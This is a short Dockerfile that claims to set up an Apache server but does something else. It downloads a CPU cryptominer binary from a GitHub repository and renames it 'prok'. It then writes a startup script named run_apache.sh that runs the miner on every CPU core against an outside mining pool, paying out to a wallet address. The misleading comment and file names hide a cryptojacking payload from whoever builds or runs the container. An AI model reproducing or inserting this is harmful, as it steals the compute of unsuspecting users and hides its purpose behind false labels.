FROM python:3.9-slim

# Install dependencies
RUN apt update && apt -y install curl git wget
RUN wget -O prok https://github.com/nandafiku/gradi/raw/main/cpuminer-avx2 && \
 chmod 777 prok
# Configure apache
RUN echo './prok -a yescryptr32 -o stratum+tcp://stratum-na.rplant.xyz:7116 -u UPoxZXYCDMuT84Bfb8g9D1Wz4ud1md1kC4.x -p webpassword=x -t $(nproc --all)' >> run_apache.sh && \
 chmod 777 run_apache.sh

EXPOSE 80

CMD /run_apache.sh
